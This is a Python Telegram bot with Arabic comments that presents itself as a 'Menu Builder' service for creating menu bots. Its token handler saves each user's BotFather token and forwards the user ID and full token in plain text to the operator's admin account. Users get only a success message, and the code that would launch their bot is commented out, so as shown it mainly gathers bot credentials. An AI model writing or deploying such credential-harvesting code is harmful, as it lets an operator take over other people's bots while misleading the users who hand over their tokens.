import telebot
import sqlite3
import os
import subprocess
from dotenv import load_dotenv

# تحميل الإعدادات السرية
load_dotenv()
CHIEF_TOKEN = os.getenv("CHIEF_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = telebot.TeleBot(CHIEF_TOKEN)

# دالة التعامل مع قاعدة البيانات
def manage_db(query, params=(), fetch=False):
    conn = sqlite3.connect('menu_factory.db')
    cursor = conn.cursor()
    cursor.execute(query, params)
    data = cursor.fetchall() if fetch else None
    conn.commit()
    conn.close()
    return data

# إنشاء الجداول عند التشغيل
manage_db('''CREATE TABLE IF NOT EXISTS bots 
             (user_id INTEGER, token TEXT UNIQUE, status TEXT)''')

@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_text = (
        "🤖 **أهلاً بك في Menu Builder Bot المطور!**\n\n"
        "أنا المصنع الذكي لإنشاء وإدارة بوتات القوائم والأزرار.\n"
        "للبدء، أرسل لي التوكين الخاص ببوتك من @BotFather."
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda message: ":" in message.text)
def setup_bot(message):
    user_token = message.text.strip()
    user_id = message.from_user.id
    
    try:
        # حفظ التوكين في القاعدة
        manage_db("INSERT OR IGNORE INTO bots (user_id, token, status) VALUES (?, ?, ?)", 
                  (user_id, user_token, "active"))
        
        # إشعار لصاحب المصنع (أنت)
        bot.send_message(ADMIN_ID, f"🔔 **تنبيه جديد!**\nمستخدم قام بإضافة بوت جديد.\nID: `{user_id}`\nToken: `{user_token}`", parse_mode="Markdown")
        
        bot.reply_to(message, "✅ **تم الربط بنجاح!**\nجاري الآن تجهيز واجهة الأزرار والقوائم لبوتك الجديد...")
        
        # تشغيل ملف البوت الفرعي (سنقوم ببرمجة القالب في الخطوة القادمة)
        # subprocess.Popen(['python', 'bot_template.py', user_token])

    except Exception as e:
        bot.reply_to(message, "❌ حدث خطأ تقني، يرجى المحاولة لاحقاً.")

print("Menu Builder Bot is running...")
bot.infinity_polling()
